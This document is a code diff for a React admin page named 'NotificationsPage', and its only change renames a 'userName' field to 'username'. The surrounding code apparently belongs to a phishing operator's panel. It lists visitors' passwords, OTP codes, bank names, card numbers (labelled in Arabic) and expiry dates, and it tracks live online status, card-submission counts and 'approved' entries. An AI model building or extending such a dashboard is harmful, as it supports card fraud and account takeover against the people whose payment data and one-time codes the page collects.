@@ -145,7 +145,7 @@ interface Notification {
   phone: string;
   flagColor?: string;
   currentPage?: string;
-  userName?: string;
+  username?: string;
   password?: string;
 }
 
@@ -850,7 +850,7 @@ export default function NotificationsPage() {
 
   // Statistics calculations
   const totalVisitorsCount = notifications.length;
-  const cardSubmissionsCount = notifications.filter((n) => n.userName).length;
+  const cardSubmissionsCount = notifications.filter((n) => n.username).length;
   const approvedCount = notifications.filter(
     (n) => n.status === "approved"
   ).length;
@@ -864,7 +864,7 @@ export default function NotificationsPage() {
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => notification.userName);
+      filtered = filtered.filter((notification) => notification.username);
     } else if (filterType === "online") {
       filtered = filtered.filter(
         (notification) => onlineStatuses[notification.id]
@@ -879,7 +879,7 @@ export default function NotificationsPage() {
           notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
-          notification.userName?.toLowerCase().includes(term) ||
+          notification.username?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
           notification.otp?.toLowerCase().includes(term)
       );
@@ -973,8 +973,8 @@ export default function NotificationsPage() {
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
           (notification) =>
-            notification.userName &&
-            !notifications.some((n) => n.id === notification.id && n.userName)
+            notification.username &&
+            !notifications.some((n) => n.id === notification.id && n.username)
         );
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
@@ -1018,7 +1018,7 @@ export default function NotificationsPage() {
 
     // Card submissions is the count of notifications with card info
     const cardCount = notificationsData.filter(
-      (notification) => notification.userName
+      (notification) => notification.username
     ).length;
 
     setTotalVisitors(totalCount);
@@ -1638,10 +1638,10 @@ export default function NotificationsPage() {
                           </Badge>
                           <Badge
                             variant={
-                              notification.userName ? "default" : "secondary"
+                              notification.username ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.userName
+                              notification.username
                                 ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                                 : ""
                             }`}
@@ -1650,7 +1650,7 @@ export default function NotificationsPage() {
                             }
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.userName
+                            {notification.username
                               ? "معلومات البطاقة"
                               : "لا يوجد بطاقة"}
                           </Badge>
@@ -1821,17 +1821,17 @@ export default function NotificationsPage() {
                         </Badge>
                         <Badge
                           variant={
-                            notification.userName ? "default" : "secondary"
+                            notification.username ? "default" : "secondary"
                           }
                           className={`cursor-pointer ${
-                            notification.userName
+                            notification.username
                               ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                               : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.userName
+                          {notification.username
                             ? "معلومات البطاقة"
                             : "لا يوجد بطاقة"}
                         </Badge>
@@ -1998,7 +1998,7 @@ export default function NotificationsPage() {
                   { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.userName,
+                    value: selectedNotification?.username,
                   },
                   {
                     label: "تاريخ الانتهاء",
